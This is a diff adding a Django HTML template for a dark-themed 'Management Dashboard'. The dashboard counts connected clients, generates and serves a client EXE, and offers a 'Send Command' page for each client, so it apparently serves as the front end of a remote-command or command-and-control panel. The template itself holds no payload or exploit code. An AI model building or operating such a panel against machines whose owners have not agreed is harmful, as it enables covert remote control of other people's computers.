@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Management Panel | Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #5b4ce8;
+            --secondary-color: #9c88ff;
+            --accent-color: #00d4c7;
+            --success-color: #00ff9d;
+            --danger-color: #ff3b6e;
+            --warning-color: #ffdd59;
+            --info-color: #00b4ff;
+            --dark-bg: #0f0f1f;
+            --dark-card: #1a1a2e;
+            --light-bg: #f8f9fa;
+            --light-card: #ffffff;
+            --header-height: 80px;
+            --neon-glow: 0 0 8px, 0 0 16px, 0 0 24px;
+        }
+
+        * {
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f0f1f 0%, #1e1e3a 60%, #2e2e5a 100%);
+            color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .glass-effect {
+            background: rgba(20, 20, 40, 0.8);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            border-radius: 16px;
+        }
+
+        .neon-border {
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 8px var(--primary-color), 
+                        inset 0 0 8px rgba(91, 76, 232, 0.3);
+        }
+
+        .neon-text-primary {
+            color: var(--primary-color);
+            text-shadow: 0 0 5px var(--primary-color), 
+                         0 0 10px var(--primary-color);
+        }
+
+        .neon-text-accent {
+            color: var(--accent-color);
+            text-shadow: 0 0 5px var(--accent-color), 
+                         0 0 10px var(--accent-color);
+        }
+
+        .neon-text-success {
+            color: var(--success-color);
+            text-shadow: 0 0 5px var(--success-color), 
+                         0 0 10px var(--success-color);
+        }
+
+        .neon-text-danger {
+            color: var(--danger-color);
+            text-shadow: 0 0 5px var(--danger-color), 
+                         0 0 10px var(--danger-color);
+        }
+
+        /* Main Header */
+        .main-header {
+            height: var(--header-height);
+            position: fixed;
+            right: 0;
+            left: 0;
+            top: 0;
+            background: rgba(20, 20, 40, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            padding: 0 40px;
+            z-index: 900;
+            border-bottom: 1px solid rgba(91, 76, 232, 0.4);
+        }
+
+        .header-title {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin: 0;
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 5px rgba(91, 76, 232, 0.5);
+        }
+
+        .header-actions {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header-nav a {
+            color: #f0f0f0;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .header-nav a:hover {
+            background: rgba(91, 76, 232, 0.25);
+            color: #fff;
+            box-shadow: 0 0 10px rgba(91, 76, 232, 0.5);
+            transform: scale(1.05);
+        }
+
+        .header-nav a i {
+            margin-right: 8px;
+        }
+
+        .theme-toggle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(91, 76, 232, 0.3);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .theme-toggle:hover {
+            transform: rotate(30deg);
+            background: rgba(91, 76, 232, 0.4);
+            box-shadow: 0 0 12px var(--primary-color);
+        }
+
+        .user-profile {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            box-shadow: 0 0 12px var(--primary-color);
+        }
+
+        .user-name {
+            font-weight: 500;
+            color: white;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: calc(var(--header-height) + 40px) 40px 40px;
+            min-height: calc(100vh - var(--header-height));
+        }
+
+        /* Stats Cards */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .stat-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin-bottom: 25px;
+            color: white;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .stat-icon.online {
+            background: linear-gradient(135deg, var(--success-color) 0%, #00cc88 100%);
+            box-shadow: 0 0 15px var(--success-color);
+        }
+
+        .stat-icon.offline {
+            background: linear-gradient(135deg, var(--danger-color) 0%, #ff4d8d 100%);
+            box-shadow: 0 0 15px var(--danger-color);
+        }
+
+        .stat-icon.total {
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            box-shadow: 0 0 15px var(--primary-color);
+        }
+
+        .stat-value {
+            font-size: 2.8rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(45deg, #fff, #e0e0e0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .stat-title {
+            color: #bbb;
+            font-size: 1.1rem;
+        }
+
+        /* Tools Section */
+        .tools-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .tool-card {
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            text-decoration: none;
+            color: inherit;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-card:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(91, 76, 232, 0.25), transparent);
+            transition: all 0.5s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+            color: var(--primary-color);
+        }
+
+        .tool-card:hover:before {
+            left: 100%;
+        }
+
+        .tool-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 25px;
+            background: rgba(91, 76, 232, 0.2);
+            color: var(--primary-color);
+            box-shadow: 0 0 15px rgba(91, 76, 232, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .tool-card:hover .tool-icon {
+            background: rgba(91, 76, 232, 0.3);
+            box-shadow: 0 0 20px var(--primary-color);
+            transform: scale(1.1);
+        }
+
+        .tool-title {
+            font-weight: 600;
+            margin-bottom: 12px;
+            font-size: 1.3rem;
+        }
+
+        .tool-desc {
+            color: #bbb;
+            font-size: 0.95rem;
+        }
+
+        /* Clients Section */
+        .clients-section {
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            margin-bottom: 40px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            color: white;
+        }
+
+        .section-title i {
+            margin-right: 12px;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px var(--primary-color);
+        }
+
+        .search-box {
+            position: relative;
+            width: 300px;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 12px 45px 12px 15px;
+            border-radius: 30px;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            background: rgba(20, 20, 40, 0.5);
+            color: white;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        .search-box input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 15px rgba(91, 76, 232, 0.4);
+            outline: none;
+        }
+
+        .search-box i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary-color);
+        }
+
+        .clients-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+        }
+
+        .client-card {
+            background: rgba(20, 20, 40, 0.8);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+            border: 1px solid rgba(91, 76, 232, 0.3);
+            position: relative;
+        }
+
+        .client-card.hidden {
+            display: none;
+        }
+
+        .client-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .client-header {
+            padding: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+        }
+
+        .client-status {
+            position: absolute;
+            top: 25px;
+            right: 25px;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+        }
+
+        .client-status.online {
+            background-color: var(--success-color);
+            box-shadow: 0 0 12px var(--success-color);
+        }
+
+        .client-status.offline {
+            background-color: var(--danger-color);
+            box-shadow: 0 0 12px var(--danger-color);
+        }
+
+        .client-name {
+            font-weight: 600;
+            margin: 0 30px 0 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            color: white;
+            font-size: 1.2rem;
+        }
+
+        .client-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .client-action-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(91, 76, 232, 0.2);
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .client-action-btn:hover {
+            background: var(--primary-color);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 0 12px var(--primary-color);
+        }
+
+        .client-body {
+            padding: 25px;
+        }
+
+        .client-info {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            font-size: 1rem;
+        }
+
+        .info-item i {
+            margin-right: 15px;
+            color: var(--primary-color);
+            width: 25px;
+            text-align: center;
+            text-shadow: 0 0 5px var(--primary-color);
+        }
+
+        .info-text {
+            color: #bbb;
+        }
+
+        .client-footer {
+            padding: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+
+        .client-btn {
+            display: inline-block;
+            padding: 12px 30px;
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            color: white;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(91, 76, 232, 0.5);
+        }
+
+        .client-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px rgba(91, 76, 232, 0.7);
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 80px 20px;
+            grid-column: 1 / -1;
+        }
+
+        .empty-icon {
+            font-size: 5rem;
+            color: #555;
+            margin-bottom: 25px;
+            text-shadow: 0 0 10px rgba(91, 76, 232, 0.3);
+        }
+
+        .empty-title {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .empty-desc {
+            color: #bbb;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+
+        /* Alerts */
+        .alert {
+            animation: slideIn 0.6s ease;
+            border-radius: 12px;
+            padding: 15px 20px;
+            background: rgba(0, 180, 255, 0.25);
+            border: 1px solid var(--info-color);
+            color: white;
+            box-shadow: 0 0 15px rgba(0, 180, 255, 0.3);
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.6s ease forwards;
+        }
+
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+        .delay-4 { animation-delay: 0.4s; }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(20, 20, 40, 0.5);
+            border-radius: 12px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-color);
+            border-radius: 12px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--secondary-color);
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .clients-grid {
+                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-header {
+                padding: 0 20px;
+            }
+
+            .header-actions {
+                gap: 15px;
+            }
+
+            .header-nav {
+                flex-wrap: wrap;
+                gap: 15px;
+            }
+
+            .section-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 20px;
+            }
+
+            .search-box {
+                width: 100%;
+            }
+
+            .stats-container, .tools-container {
+                grid-template-columns: 1fr;
+            }
+
+            .header-title {
+                font-size: 1.3rem;
+            }
+
+            .user-name {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Header -->
+    <header class="main-header glass-effect">
+        <h1 class="header-title">Management Dashboard</h1>
+        
+        <div class="header-actions">
+            <div class="header-nav d-flex align-items-center">
+                <a href="#" class="active"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="#"><i class="fas fa-laptop"></i> Clients</a>
+                <a href="#"><i class="fas fa-terminal"></i> Commands</a>
+                <a href="#"><i class="fas fa-file-alt"></i> Reports</a>
+                <a href="#"><i class="fas fa-cog"></i> Settings</a>
+                <a href="#"><i class="fas fa-user-shield"></i> User Management</a>
+                <a href="#"><i class="fas fa-history"></i> Activity History</a>
+            </div>
+            <button class="theme-toggle" id="themeToggle">
+                <i class="fas fa-moon"></i>
+            </button>
+            <div class="user-profile">
+                <div class="user-avatar">AD</div>
+                <span class="user-name">System Admin</span>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <main class="main-content">
+        {% if message %}
+        <div class="alert alert-info alert-dismissible fade show fade-in glass-effect">
+            <i class="fas fa-info-circle me-2" style="color: var(--info-color);"></i>
+            {{ message }}
+            <button type="button" class="btn-close" data-bs-dismiss="alert" style="filter: invert(1);"></button>
+        </div>
+        {% endif %}
+        
+        <!-- Stats Cards -->
+        <div class="stats-container">
+            <div class="stat-card fade-in delay-1">
+                <div class="stat-icon online">
+                    <i class="fas fa-link"></i>
+                </div>
+                <div class="stat-value">{{ online_count }}</div>
+                <div class="stat-title">Connected Clients</div>
+            </div>
+            
+            <div class="stat-card fade-in delay-2">
+                <div class="stat-icon offline">
+                    <i class="fas fa-unlink"></i>
+                </div>
+                <div class="stat-value">{{ offline_count }}</div>
+                <div class="stat-title">Disconnected Clients</div>
+            </div>
+            
+            <div class="stat-card fade-in delay-3">
+                <div class="stat-icon total">
+                    <i class="fas fa-laptop"></i>
+                </div>
+                <div class="stat-value">{{ clients|length }}</div>
+                <div class="stat-title">Total Clients</div>
+            </div>
+        </div>
+        
+        <!-- Tools Section -->
+        <div class="clients-section fade-in delay-4">
+            <h2 class="section-title">
+                <i class="fas fa-tools"></i>
+                Management Tools
+            </h2>
+            
+            <div class="tools-container">
+                <a href="{% url 'generate_exe' %}" class="tool-card">
+                    <div class="tool-icon">
+                        <i class="fas fa-file-code"></i>
+                    </div>
+                    <h3 class="tool-title">Generate New EXE</h3>
+                    <p class="tool-desc">Create new client version</p>
+                </a>
+                
+                <a href="{% url 'download_device' %}" class="tool-card">
+                    <div class="tool-icon">
+                        <i class="fas fa-download"></i>
+                    </div>
+                    <h3 class="tool-title">Download EXE</h3>
+                    <p class="tool-desc">Latest generated version</p>
+                </a>
+                
+                <a href="#" class="tool-card">
+                    <div class="tool-icon">
+                        <i class="fas fa-cog"></i>
+                    </div>
+                    <h3 class="tool-title">System Settings</h3>
+                    <p class="tool-desc">Configure server settings</p>
+                </a>
+            </div>
+        </div>
+        
+        <!-- Clients List -->
+        <div class="clients-section fade-in">
+            <div class="section-header">
+                <h2 class="section-title">
+                    <i class="fas fa-list-ul"></i>
+                    Clients List
+                </h2>
+                
+                <div class="search-box">
+                    <input type="text" id="clientSearch" placeholder="Search clients...">
+                    <i class="fas fa-search"></i>
+                </div>
+            </div>
+            
+            <div class="clients-grid">
+                {% if clients %}
+                    {% for client in clients %}
+                    <div class="client-card" data-name="{{ client.display_name|default:client.client_id }}">
+                        <div class="client-header">
+                            <div class="client-status {% if client.is_online %}online{% else %}offline{% endif %}"></div>
+                            <h3 class="client-name">{{ client.display_name|default:client.client_id }}</h3>
+                            <div class="client-actions">
+                                <button class="client-action-btn" onclick="showRenameDialog('{{ client.client_id }}')">
+                                    <i class="fas fa-edit"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="client-body">
+                            <div class="client-info">
+                                <div class="info-item">
+                                    <i class="fas fa-clock"></i>
+                                    <span class="info-text">Last Seen: {{ client.last_seen|date:"Y/m/d H:i" }}</span>
+                                </div>
+                                <div class="info-item">
+                                    <i class="fas fa-terminal"></i>
+                                    <span class="info-text">Last Command: {{ client.last_command|default:"No activity"|truncatechars:20 }}</span>
+                                </div>
+                                <div class="info-item">
+                                    <i class="fas fa-microchip"></i>
+                                    <span class="info-text">CPU Usage: {{ client.cpu_usage }}</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="client-footer">
+                            <a href="{% url 'cmd_page' client_id=client.client_id %}" class="client-btn">
+                                <i class="fas fa-terminal me-1"></i>
+                                Send Command
+                            </a>
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div class="empty-state">
+                        <div class="empty-icon">
+                            <i class="fas fa-laptop-slash"></i>
+                        </div>
+                        <h3 class="empty-title">No Active Clients Found!</h3>
+                        <p class="empty-desc">No devices are currently connected to the system.</p>
+                        <a href="{% url 'generate_exe' %}" class="client-btn">
+                            Generate Executable
+                        </a>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Theme Toggle
+        document.getElementById('themeToggle').addEventListener('click', function() {
+            document.body.classList.toggle('dark-mode');
+            localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
+            
+            const icon = this.querySelector('i');
+            if (document.body.classList.contains('dark-mode')) {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+            } else {
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+            }
+        });
+        
+        // Load saved theme
+        if (localStorage.getItem('theme') === 'dark') {
+            document.body.classList.add('dark-mode');
+            const icon = document.querySelector('#themeToggle i');
+            icon.classList.remove('fa-moon');
+            icon.classList.add('fa-sun');
+        }
+        
+        // Show rename dialog
+        function showRenameDialog(clientId) {
+            const newName = prompt('Enter new name:', clientId);
+            if (newName && newName.trim() !== '') {
+                fetch(`/update-client-name/${clientId}/`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-CSRFToken': '{{ csrf_token }}'
+                    },
+                    body: `new_name=${encodeURIComponent(newName.trim())}`
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        location.reload();
+                    }
+                });
+            }
+        }
+        
+        // Card animations
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('fade-in');
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        document.querySelectorAll('.stat-card, .tool-card, .client-card').forEach(card => {
+            observer.observe(card);
+        });
+
+        // Live search filter
+        document.getElementById('clientSearch').addEventListener('input', function() {
+            const searchValue = this.value.trim().toLowerCase();
+            const clientCards = document.querySelectorAll('.client-card');
+            
+            clientCards.forEach(card => {
+                const clientName = card.getAttribute('data-name').toLowerCase();
+                if (searchValue === '' || clientName.includes(searchValue)) {
+                    card.classList.remove('hidden');
+                } else {
+                    card.classList.add('hidden');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
